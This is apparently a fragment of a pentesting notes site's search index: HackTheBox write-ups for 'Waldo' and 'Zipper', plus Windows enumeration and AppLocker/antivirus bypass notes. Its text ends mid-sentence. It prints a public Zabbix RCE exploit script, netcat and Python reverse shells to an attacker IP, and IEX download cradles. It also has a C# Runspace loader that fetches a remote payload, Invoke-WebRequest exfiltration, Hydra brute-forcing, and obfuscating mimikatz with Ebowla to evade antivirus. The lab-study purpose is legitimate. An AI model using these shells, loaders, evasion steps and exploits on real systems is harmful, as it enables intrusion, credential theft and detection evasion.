	"content": "WALDO\nInstead of giving binaries system-wide permissions, give them the permissions they need to do the job.\nSkipping past Nmap, after messing around with the request’s found three request fileWrite, dirRead, fileRead. FileWrite writes user-supplied input to list1. dirRead will enumerate directories and print out the content. fileRead needs the exact file path to work.\nSqlmap, Wfuzz didn’t work I had more success with wfuzz but I couldn’t filter the output. Nothing I tried allowed me to escape the current directory. Examining what’s available the PHP source code that’s running the website. The PHP script appears to call a bunch of functions from the PHP library =D. REQUEST_METHOD determines whether the request was a post or a get === strict comparison to POST request. the first few parts of the stript involve telling the browser what kind of data to expect Content-Type. “str_replace — Replace all occurrences of the search string with the replacement string” str_replace takes every occurrence of the the subject and replaces those values with replace. Mixed str_replace ( mixed $search , mixed\nIt finds ../ or ..\\” it will replace them with nothing the two quotes in replace represent nothing. the next part say if file name === (strict) user.txt print false(no user.txt) . /n/t/t, /n newline /tab /tab json_encode($filecontent) is taking the var file content and encoding the output(that will matter later) taking all this into consideration the script only checks for ../ or ..\\ anything else it find’s, it’ll ignore. I tried encoding these in every possible way. Then I was reading about LFI and saw it ….// yes the holy grail. ….//….//….// escaped out and allowed for directory traversal.\nI didn’t see .ssh at first because I’ve seen it before. when trying to view .ssh with fileRead it spat out is a directory noticed the output with request differs from .ash_history. bash_history produces false .ssh produced a file. Plug that into fileRead. Then you should find ssh private key!!! the format all fudged. using vim repeat I was able to clean up the file. when editing the file \\n is not a null character, it means newline in JSON. need to also get rid of “\\” this part was also tricky because of these two ports 9000 8888 rabbit holes. Netstat -antp after looking at it for a while noticed some of the ssh connection came from local address rcf-1904 address from localhost weird. That was the next big hint. Since the .monitor file is local now it’ll make it easier to use. the next username is monitor. Next were cast into a restricted environment (jail) to get out of this use the -t switch in ssh -t (bash — noprofile). Lots of rabbit holes \u0026amp; some useless tools.\nssh monitor@waldo -i .monitor -t \u0026quot;bash --noprofile\u0026quot;  PERMISSIONS\n-rwSr--r-- 1 root root first s is the suid bit the capital S denotes the file isn't executable. -rwsr-sr-x 1 root root first s is the suid bit second is the guid bit sticky bit the file gets its permissions from the parent directory  The for mentioned permissions are system-wide can have unintended effects that can often lead to getting root access in one way or another. If the binaries only need to read files with root permissions. Theirs this thing called capabilities. where the file is given limited permission as root. There is a whole a lot of different ones to choose from the one we’re interested in is.\n/usr/bin/tac = cap_dac_read_search  Allows the binary to read files as root. It took a while to find the tools full path getcap basically the find command for Linux capabilities.\n/sbin/getcap -r / 2\u0026gt;/dev/null. If you don’t run it with dev/null it’ll kind of lead you to the .monitor script but we want tac. tac just cat but in reverse lol. cat /root/root.txt  Conclusion\nInstead of giving binaries system-wide permissions, give them the permissions they need to do the job.\n"
},
{
	"uri": "/concepts/webapppentest/",
	"title": "WebAppPenTests",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/webapp/",
	"title": "WebApps",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/windows/",
	"title": "Windows",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/windows/windows_enum/",
	"title": "Windows",
	"tags": [],
	"description": "",
	"content": "/ETC/HOSTS FOR WINDOWS to change local DNS IN windows.\nnotepad c:\\womdpws\\system32\\drivers\\etc\\hosts  Commands\nFinding things in windows.\nfind /I \u0026quot;thing\u0026quot; secrets.txt findstr \u0026quot;thing\u0026quot;  Shell preferences nishang \u0026lt; nc \u0026lt; winrm / meterpreter\nwhoami /all /priv systeminfo findstr\t= grep  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.\n$password = read-host \u0026quot;Su-ErD;perPa$sw0rd\u0026quot; -assecurestring $useraccount = get-localuser -name \u0026quot;pinkiepie\u0026quot; $useraccount | set-localuser -password $password  os\nhttps://developer.microsoft.com/en-us/windows/downloads/virtual-machines\nWindows File Type for running commands scripts executables. I found this list looking up applocker policies.\nAppLocker ApplockerFileExtentions\n   Executable Scripts Installers DLL     exe js msi dll   com ps1 msp ocx    vbs      cmd      bat      HOST BASED FIREWALL\nnetsh firewall dump netsh advfirewall firewall show rule name=all  LocalGroup Policy\nchecking group policy is quickly becoming the mantra for pentesters. you can enumerating pretty easily net\nnet localgroup net localgroup users net users  Rule\u0026rsquo;s are applied to the whole, rather than indivual applications. example all scripts are band unless otherwise mentioned.\nNot Configured \u0026ldquo;By default, enforcement is not configured in a rule collection. If rules are present in the corresponding rule collection, they are enforced. If rule enforcement is configured in a higher-level linked Group Policy object (GPO), that enforcement value overrides the Not configured value.\u0026rdquo;\nAPPLOCKER\nGet-AppLockerPolicy -Effective -XML \u0026gt; meow.xml  FILE TRANSFER\nThe Invoke-WebRequest method can be used to drop files to disk or exfil some files from the system. using the post -method we can send a text/xml file across to a netcat listener.\nMemory\nIEX(New-Object Net.WebClient).downloadString('http://IP_ADDRESS/file-needed')  Disk\n(DOWNLOAD)\ndata-binary  iwr('http://change.me/file.txt') -outfile file.txt python -m SimpleHTTPServer 80  (UPLOAD)\nInvoke-WebRequest -Uri http://change.me -Proxy 'http://change.me:80' -Method Post -InFile meow.xml  DIRECTORIES WE CAN ALWAYS CALL HOME\nC:\\Users\\user\\AppData\\Local\\Microsoft\\WindowsApps C:\\Windows\\Tasks C:\\Windows\\Temp C:\\windows\\tracing C:\\Windows\\Registration\\CRMLog C:\\Windows\\System32\\FxsTmp C:\\Windows\\System32\\com\\dmp C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys C:\\Windows\\System32\\spool\\PRINTERS C:\\Windows\\System32\\spool\\SERVERS C:\\Windows\\System32\\spool\\drivers\\color C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter C:\\Windows\\SysWOW64\\FxsTmp C:\\Windows\\SysWOW64\\com\\dmp C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System  PowerShell obfuscation\nhttps://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf https://github.com/danielbohannon/Invoke-Obfuscation http://pentestit.com/invoke-obfuscation-powershell-command-script-obfuscator/ https://cobbr.io/ObfuscationDetection.html https://gallery.technet.microsoft.com/scriptcenter/Generate-obfuscated-string-6ec72ffe https://richardspowershellblog.wordpress.com/2017/10/30/powershell-file-extensions/ https://www.varonis.com/blog/powershell-obfuscation-stealth-through-confusion-part-i/  Environment Variables\n​ \u0026ldquo;An environment variable is a dynamic \u0026ldquo;object\u0026rdquo; on a computer, containing an editable value, which may be used by one or more software programs in Windows. Environment variables help programs know what directory to install files in, where to store temporary files, and where to find user profile settings.\u0026rdquo;\n​ This allows you to store values and call them as variables inside powershell and cmd.exe like certain directories, file paths, system Values for example echo %PATH%. which will list bunch of directories. Cmd \u0026amp; powershell both support this but have different syntax. An example would be cmd %pie% ps ``\n​ To list all of the Enviroment variables use get-childitem env: or get-item env:\nget-childitem env: get-item env:  ​ This can be used to run executables, scripts, dll ,msi but it\u0026rsquo;s just limited to pointing to the file and \u0026amp; must be in front. you can also put data in the fields. It must have $ infront of $env then a colon $env:variable. How to set a env var pretty straightforward. set NameVariable Path example set pink=pie to view simply type get-childitem env:\nSET\nsetx var \u0026quot;path\u0026quot; sometimes /M set var=\u0026quot;path\u0026quot;\tno spaces between var \u0026amp; path  examples Command Invocation Operator can be used to execute files\n\u0026amp; $env:powershellscript\t**\texecuting  Invoke-Expression\nI would like to cover how to exploit a script using invoke-expression and some of the unique qualities. a semicolon will escape out and force something to be unpetted example\n;powershell c:\\users\\user\\desktop\\host.ps1 Cannot perform a cyclic copy 0 File(s) copied Directory: C:\\Users\\User\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/24/2019 8:11 AM success  This will take a system variable and run host.ps1.\n;powerhsell $env:meow PS C:\\Users\\User\\desktop \u0026gt; set meow=c:\\users\\user\\desktop\\host.ps1 COMMANDO 7/24/2019 8:16:10 AM PS C:\\Users\\User\\desktop \u0026gt; .\\easyhelpline.ps1 Cannot perform a cyclic copy 0 File(s) copied Directory: C:\\Users\\User\\desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 7/24/2019 8:19 AM success  lets try other characters see how they are impeded there are some special characters. Well use the backtic n backtic\nhttps://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_special_characters?view=powershell-6\n\u0026quot;theres a line`n` Break here  | Character | Description | | --------- | ----------------------- | | `0 | Null | | `a | Alert | | `b | Backspace | | `e | Escape | | `f | Form feed | | `n | New line | | `r | Carriage return | | `t | Horizontal tab | | `u{x} | Unicode escape sequence | | `v | Vertical tab | | --% | Stop parsing |  Escape Sequence\n   `\u0026rdquo; Doube quote     `\u0026rsquo; single quote   `` back quote   `0 null    dor operator this will\n powershell -command . c:\\users\\user\\desktop\\host.ps1  .*\\bi[“‘`]*e[“‘`]*x\\b.*  "
},
{
	"uri": "/concepts/bypass/",
	"title": "Windows-Bypass",
	"tags": [],
	"description": "",
	"content": "I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can\u0026rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.\nCLM uses umci policy to determine what powershell scripts are approved(whitelisted). which seems exploitable xD\nhttps://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\n*What does Constrained Language constrain?\nConstrained Language consists of a number of restrictions that limit unconstrained code execution on a locked-down system. These restrictions are:\n PowerShell module script files must explicitly export functions by name without the use of wildcard characters. This is to prevent inadvertently exposing powerful helper function not meant to be used publicly. PowerShell module manifest files must explicitly export functions by name without the use of wildcards. Again, to prevent inadvertent exposure of functions. COM objects are blocked. They can expose Win32 APIs that have likely never been rigorously hardened as part of an attack surface. Only approved .NET types are allowed. Many .NET types can be used to invoke arbitrary Win32 APIs. As a result only specific whitelisted types are allowed. Add-Type is blocked. It allows the creation of arbitrary types defined in different languages. The use of PowerShell classes are disallowed. PowerShell classes are just arbitrary C# type definitions. PowerShell type conversion is not allowed. Type conversion implicitly creates types and runs type constructors. Dot sourcing across language modes is disallowed. Dot sourcing a script file brings all functions, variables, aliases from that script into the current scope. So this blocks a trusted script from being dot sourced into an untrusted script and exposing all of its internal functions. Similarly, an untrusted script is prevented from being dot sourced into a trusted script so that it cannot pollute the trusted scope. Command resolution automatically hides commands you cannot run. For example, a function created in Constrained Language mode is not visible to script running in Full Language mode. XAML based workflows are blocked since they cannot be constrained by PowerShell. But script based workflows and trusted XAML based workflows shipped in-box are allowed. The SupportedCommand parameter for Import-LocalizedData is disabled. It allows additional commands prevented by Constrained Language. Invoke-Expression cmdlet always runs in Constrained Language. Invoke-Expression cannot validate input as trusted. Set-PSBreakpoint command is blocked unless there is a system-wide lockdown through UMCI. Command completers are always run in Constrained Language. Command completers are not validated as trustworthy. Commands and script run within the script debugger will always be run in Constrained Language if there is a system-wide lockdown. The DSC Configuration keyword is disabled. Supported commands and Statements are not allowed in script DATA sections. Start-Job is unavailable if the system is not locked-down. Start-Job starts PowerShell in a new process and if the system is not locked-down the new process runs in Full Language mode.  *\nIf PowerShell version 2 is available you may be able to use this trick.\nPowerShell -Version 2 -ExecutionPolicy ByPass -command \u0026quot;\u0026quot;  to check for constrained language mode.\n$ExecutionContext.SessionState.LanguageMode  $ExecutionContext.SessionState.LanguageMode = \u0026quot;FullLanguage\u0026quot;  ie (New-Object Net.WebClient).DownloadString('http://changeme/powerview.ps1')  [System.Console]::WriteLine(\u0026quot;Hello\u0026quot;)  c:\\windows\\microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U .\\meh.exe  RunScapes\nRunscapes create a parallel process of power shell and execute command through that bypassing current restrictions. My Best explanation of what this is doing is that were creating a method that we call to create another shell.\nstatic void Main(string[] args) { Runspace run = RunspaceFactory.CreateRunspace(); run.Open(); PowerShell shell = PowerShell.Create(); shell.Runspace = run; String exec = \u0026quot;iex(new-object net.webclient).DownloadString('http://10.10.0.0/payload); shell.AddScript(exec); shell.Invoke(); run.Close(); }  String exec = \u0026quot;$ExecutionContext.SessionState.LanguageMode\u0026quot;; shell.AddScript(exec); Collection\u0026lt;PSObject\u0026gt; output = shell.Invoke(); foreach( PSOBject o in output ) { Console.Write(o.ToString()); } run.Close();  WriteAble executable directories.\nBypassing anti virus\nUsing, Ebowla to bypass detection, why because anti virus looks for matching code to detect malicious software. You can use encryptions and decoding to evade detection. This for me is a last resort ill spend awhile trying to bypass restrictions. I may upload binaries.\ngenetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computer name as the target.\ntrying to get a payload to work was touchy my objective now is to encode Binary using Ebowla. I typically try to bring both copies a x86 and x64 binaries.\nnote: locate mimi*.exe find the x64 version then copy it into Ebowla.\npython ebowla.py binary.exe genetic.config  ./build_x64_go.sh output/go_symmetric_binary_x64.exe.gp bianry.exe  "
},
{
	"uri": "/hackthebox/boxes/zipper/",
	"title": "Zipper",
	"tags": [],
	"description": "",
	"content": " NMAP\ninitial\n# Nmap 7.70 scan initiated Fri Feb 15 14:32:38 2019 as: nmap -sC -sV -oA nmap/intial -T4 10.10.10.108 Nmap scan report for 10.10.10.108 Host is up (0.046s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 59:20:a3:a0:98:f2:a7:14:1e:08:e0:9b:81:72:99:0e (RSA) | 256 aa:fe:25:f8:21:24:7c:fc:b5:4b:5f:05:24:69:4c:76 (ECDSA) |_ 256 89:28:37:e2:b6:cc:d5:80:38:1f:b2:6a:3a:c3:a1:84 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 15 14:32:49 2019 -- 1 IP address (1 host up) scanned in 10.44 seconds  TOTAL\nnmap -T3 -Pn -p- -oA total 10.10.10.108 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 14:43 EST Nmap scan report for 10.10.10.108 Host is up (0.048s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 10050/tcp open zabbix-agent  UDP\nGOBUSTER \u0026ndash;10.10.10.108\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.108  /zabbix (Status: 301)  /images (Status: 301) /img (Status: 301) /audio (Status: 301) /local (Status: 403) /app (Status: 403) /js (Status: 301) /include (Status: 403) /conf (Status: 403) /styles (Status: 301) /fonts (Status: 301) /locale (Status: 301)  had some errors enuemrating local sinces its 403 force wildcards and then had to remove 404\ngobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.108/zabbix/local -fw -s \u0026quot;200,204,301,302,307\u0026quot;  SEARCHSPLOIT /usr/share/exploitdb/\nZabbix - (Authenticated) Remote Command Execution (Metasploit) | exploits/linux/remote/29321.rb Zabbix 2.0 \u0026lt; 3.0.3 - SQL Injection | exploits/php/webapps/40353.py Zabbix 2.0.1 - Session Extractor X | exploits/php/webapps/20087.py Zabbix 2.0.5 - Cleartext ldap_bind_Password Password Disclosure (Me | exploits/php/webapps/36157.rb Zabbix 2.0.8 - SQL Injection / Remote Code Execution (Metasploit) | xploits/unix/webapps/28972.rb Zabbix 2.2 \u0026lt; 3.0.3 - API JSON-RPC Remote Code Execution X | exploits/php/webapps/39937.py Zabbix 2.2.x/3.0.x - SQL Injection | xploits/php/webapps/40237.txt Zabbix Agent - 'net.tcp.listen' Command Injection (Metasploit) | exploits/freebsd/remote/16918.rb Zabbix Agent 3.0.1 - 'mysql.size' Shell Command Injection | exploits/linux/local/39769.txt Zabbix Agent \u0026lt; 1.6.7 - Remote Bypass | exploits/multiple/webapps/10431.txt Zabbix Server - Arbitrary Command Execution (Metasploit) | exploits/linux/remote/20796.rb Zabbix Server - Multiple Vulnerabilities | exploits/multiple/webapps/10432.txt  WEBAPP\nSo apartently getting a users credentials isn\u0026rsquo;t nessisary to get what i need but i dont have creds but i have access to guest account which will give me access to whatever is need to get rce.\nhttp://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.106180\nSQL INHJECTION\ntesting parameters\ntried testing latest,oho oaram toggle_ids for sql injection nothing returned, but burp did hang which is very very odd.\nsearchsploit python binary 39937.py returns none. i had errors playing around with the sql part in burp. I believe this is protected. since guest login is enabled removing the login parts was nessisary as the login part isn\u0026rsquo;t nessisary.\nimport requests import json import readline  BURPHYDRA\nHydra seems a little tricky tried some short password list to no avail but might have been using the wrong post request parameters.\nhydra 10.10.10.108 -L /home/htb/wordlist/seclist/Usernames/top-usernames-shortlist.txt -P /home/htb/wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http-form-post \u0026quot;/zabbix/index.php:name=^USER^\u0026amp;password=^PASS^\u0026amp;autologin=1\u0026amp;enter=Sign+in:Login name or password is incorrect.\u0026quot;  Sucess\nhydra 10.10.10.108 -L users -P /home/htb /wordlist/seclist/Passwords/Common-Credentials/10-million-password-list-top-10000.txt http- form-post \u0026quot;/zabbix/index.php:name=^USER^\u0026amp;password=^PASS^\u0026amp;autologin=1\u0026amp;enter=Sign+in:Login na me or password is incorrect.\u0026quot; -I  Reviewing 33937.py\nhttps://www.exploit-db.com/exploits/39937\npretty straight forward but some parts of it are broken or didn\u0026rsquo;t work because the code return none but thats put in and i dont know what to change it to. Moving forward just have to remove those elements form the binary and add print cmd_exec/\nDO NOT COPY PASTA EDIT YOUR SELF.\n#!/usr/bin/env python # -*- coding: utf-8 -*- # Exploit Title: Zabbix RCE with API JSON-RPC # Date: 06-06-2016 # Exploit Author: Alexander Gurin # Vendor Homepage: http://www.zabbix.com # Software Link: http://www.zabbix.com/download.php # Version: 2.2 - 3.0.3 # Tested on: Linux (Debian, CentOS) # CVE : N/A import requests import json import readline ZABIX_ROOT = 'http://192.168.66.2'\t### Zabbix IP-address url = ZABIX_ROOT + '/api_jsonrpc.php'\t### Don't edit login = 'Admin'\t### Zabbix login password = 'zabbix'\t### Zabbix password hostid = '10084'\t### Zabbix hostid ### auth payload = { \u0026quot;jsonrpc\u0026quot; : \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot; : \u0026quot;user.login\u0026quot;, \u0026quot;params\u0026quot;: { 'user': \u0026quot;\u0026quot;+login+\u0026quot;\u0026quot;, 'password': \u0026quot;\u0026quot;+password+\u0026quot;\u0026quot;, }, ################### # \u0026quot;auth\u0026quot; : None, \u0026quot;id\u0026quot; : 0, } headers = { 'content-type': 'application/json', } auth = requests.post(url, data=json.dumps(payload), headers=(headers)) auth = auth.json() while True: cmd = raw_input('\\033[41m[zabbix_cmd]\u0026gt;\u0026gt;: \\033[0m ') if cmd == \u0026quot;\u0026quot; : print \u0026quot;Result of last command:\u0026quot; if cmd == \u0026quot;quit\u0026quot; : break ############################### ### update payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.update\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;command\u0026quot;: \u0026quot;\u0026quot;+cmd+\u0026quot;\u0026quot; }, #################################### #\t\u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers)) ######################## ### execute payload = { \u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.execute\u0026quot;, \u0026quot;params\u0026quot;: { \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;hostid\u0026quot;: \u0026quot;\u0026quot;+hostid+\u0026quot;\u0026quot; }, ################################ #\t\u0026quot;auth\u0026quot; : auth['result'], \u0026quot;id\u0026quot; : 0, } cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers)) cmd_exe = cmd_exe.json() ################################### #\tprint cmd_exe[\u0026quot;result\u0026quot;][\u0026quot;value\u0026quot;] print cmd_exe  while True: ########################################### cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 9017 \u0026gt;/tmp/f') ######################################3#### if cmd == \u0026quot;\u0026quot; : print \u0026quot;Result of last command:\u0026quot; if cmd == \u0026quot;quit\u0026quot; : break  To get a reverse shell i just used\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.14 7001 \u0026gt;/tmp/f nc -lvnp 7001  End up in a stricted shell can\u0026rsquo;t run python i checked the paths\n/usr/bin/python, 2.7, 2, 3,  Os =version\nVERSION_ID=\u0026quot;18.04\u0026quot; [-] Hostname:da419a43ab60 eth0: inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) tcp 0 0 172.17.0.2:80  DOCKER\n[+] Looks like we're in a Docker container: 12:perf_event:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 11:net_cls,net_prio:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 10:pids:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 9:cpuset:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 8:freezer:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 7:hugetlb:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 5:blkio:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 4:memory:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 3:cpu,cpuacct:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 2:devices:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 1:name=systemd:/docker/da419a43ab60e86b7b827653d24750fc080054e1027214a66db0c468fc29efb8 0::/system.slice/docker.service -rwxr-xr-x 1 root root 0 Feb 19 11:14 /.dockerenv  There are multiple connection to 172.17.0.2\n$ for ip in $(seq 1 254); do nc -zv -w 1 172.17.0.$ip 22 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'Host name lookup'|grep -v 'Connection timed out' \u0026amp; done\u0026gt; \u0026gt; da419a43ab60 [172.17.0.2] 22 (ssh) : Connection refused  aparently im in the wrong place back to zabbix lol\ntried logging into mysql as zabbix\nmysql -u Zapper -p Enter password: zapper ERROR 1045 (28000): Access denied for user 'Zapper'@'localhost' (using password: YES)  USER INFORMATION USER.CHECKAUTHENTICATION https://www.zabbix.com/documentation/3.0/manual/api/reference/user/login\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.checkAuthentication\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;sessionid\u0026quot; : \u0026quot;fe104ec22e55d13c8e86cb66c93dc6f6\u0026quot;} , \u0026quot;id\u0026quot;: 1}  {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.login\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;user\u0026quot;:\u0026quot;Zapper\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;zapper\u0026quot;, \u0026quot;userData\u0026quot;:true},\u0026quot;id\u0026quot;: 1}  USER.GET\nhttps://www.zabbix.com/documentation/3.0/manual/api/reference/user/get\n{\u0026quot;userid\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;alias\u0026quot;:\u0026quot;Admin\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Zabbix\u0026quot;,\u0026quot;surname\u0026quot;:\u0026quot;Administrator\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;autologin\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;autologout\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;lang\u0026quot;:\u0026quot;en_GB\u0026quot;,\u0026quot;refresh\u0026quot;:\u0026quot;30\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;theme\u0026quot;:\u0026quot;default\u0026quot;,\u0026quot;attempt_failed\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;attempt_ip\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;attempt_clock\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;rows_per_page\u0026quot;:\u0026quot;50\u0026quot;}, ##################################################################{\u0026quot;userid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;alias\u0026quot;:\u0026quot;guest\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;surname\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;autologin\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;autologout\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;lang\u0026quot;:\u0026quot;en_GB\u0026quot;,\u0026quot;refresh\u0026quot;:\u0026quot;30\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;1\u0026quot;,\u0026quot;theme\u0026quot;:\u0026quot;default\u0026quot;,\u0026quot;attempt_failed\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;attempt_ip\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;attempt_clock\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;rows_per_page\u0026quot;:\u0026quot;50\u0026quot;}, ##################################################################{\u0026quot;userid\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;alias\u0026quot;:\u0026quot;Zapper\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;chicken\u0026quot;,\u0026quot;surname\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;url\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;autologin\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;autologout\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;lang\u0026quot;:\u0026quot;en_GB\u0026quot;,\u0026quot;refresh\u0026quot;:\u0026quot;30\u0026quot;,\u0026quot;type\u0026quot;:\u0026quot;3\u0026quot;,\u0026quot;theme\u0026quot;:\u0026quot;default\u0026quot;,\u0026quot;attempt_failed\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;attempt_ip\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;attempt_clock\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;rows_per_page\u0026quot;:\u0026quot;50\u0026quot;  {\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;user.get\u0026quot;, \u0026quot;params\u0026quot; : {\u0026quot;output\u0026quot;:\u0026quot;extend\u0026quot;}, \u0026quot;auth\u0026quot;:\u0026quot;cf59b1d9c2addcf06b7630b3730e3d8c\u0026quot;, \u0026quot;id\u0026quot;: 1}  UPDATE SCRIPT\nthis little bit will add the script and give it an id\nhttps://www.zabbix.com/documentation/2.0/manual/appendix/api/script/update\ndidn\u0026rsquo;t get this version to work with the python3 payload but it works later on when using the script. im not sure how to escape out the error the one liner is causing.\nnetcat shell works\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;script.update\u0026quot;, \u0026quot;params\u0026quot;: {\u0026quot;hostids\u0026quot;:\u0026quot;10105\u0026quot;, \u0026quot;scriptid\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;command\u0026quot;: \u0026quot;/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;10.10.14.14\u0026quot;,9017));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'\u0026quot;, \u0026quot;execute_on\u0026quot;: \u0026quot;1\u0026quot;}, \u0026quot;auth\u0026quot;: \u0026quot;7218f7f45344ee78c2f4c6336d715797\u0026quot; , \u0026quot;id\u0026quot;: 0}  HOSTGROUP.GET https://www.zabbix.com/documentation/3.0/manual/api/reference/hostgroup/get\n{\u0026quot;jsonrpc\u0026quot;: \u0026quot;2.0\u0026quot;, \u0026quot;method\u0026quot;: \u0026quot;hostgroup.get\u0026quot;, \u0026quot;params\u0026quot;: {}, \u0026quot;auth\u0026quot;:\u0026quot;03a71c71238717564bd227ea6d356130\u0026quot;, \u0026quot;id\u0026quot;: 1}  {\u0026quot;groupid\u0026quot;:\u0026quot;2\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Linux servers\u0026quot;,\u0026quot;internal\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;flags\u0026quot;:\u0026quot;0\u0026quot;}, {\u0026quot;groupid\u0026quot;:\u0026quot;4\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;Zabbix servers\u0026quot;,\u0026quot;internal\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;flags\u0026quot;:\u0026quot;0\u0026quot;}]  EXECUTE SCRIPT\nthere are two scripts 1 \u0026amp; 2. 1 is ping host,conn which pings the localhost, 2 does a 